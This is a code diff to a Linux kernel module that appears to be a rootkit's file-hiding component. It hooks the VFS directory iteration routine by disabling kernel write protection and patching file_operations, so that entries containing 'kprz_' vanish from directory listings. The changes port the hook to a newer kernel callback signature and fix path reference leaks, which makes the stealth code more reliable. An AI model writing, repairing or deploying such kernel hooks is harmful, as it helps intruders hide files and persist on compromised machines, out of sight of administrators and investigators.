@@ -1,16 +1,18 @@
 #include "vfs_file_hiding.h"
 #include <linux/fs.h>
+#include <linux/file.h>
 #include <linux/namei.h>
 #include <linux/slab.h>
 #include <linux/uaccess.h>
+#include <linux/cred.h>
 #include <linux/string.h>
 
 static struct file_operations *original_fops;
 static int (*original_iterate_shared)(struct file *, struct dir_context *);
 
-static int hidden_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
+static bool hidden_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
     if (strnstr(name, "kprz_", namlen))
-        return 0;
+        return true;
     return ctx->actor(ctx, name, namlen, offset, ino, d_type);
 }
 
@@ -31,8 +33,10 @@ void setup_vfs_file_hiding(void) {
         return;
 
     file = dentry_open(&path, O_RDONLY, current_cred());
-    if (IS_ERR(file))
+    if (IS_ERR(file)) {
+        path_put(&path);
         return;
+    }
 
     original_fops = (struct file_operations *)file->f_op;
     original_iterate_shared = original_fops->iterate_shared;
@@ -42,6 +46,7 @@ void setup_vfs_file_hiding(void) {
     enable_write_protection();
 
     fput(file);
+    path_put(&path);
 }
 
 void remove_vfs_file_hiding(void) {
@@ -52,12 +57,15 @@ void remove_vfs_file_hiding(void) {
         return;
 
     file = dentry_open(&path, O_RDONLY, current_cred());
-    if (IS_ERR(file))
+    if (IS_ERR(file)) {
+        path_put(&path);
         return;
+    }
 
     disable_write_protection();
     ((struct file_operations *)file->f_op)->iterate_shared = original_iterate_shared;
     enable_write_protection();
 
     fput(file);
+    path_put(&path);
 }
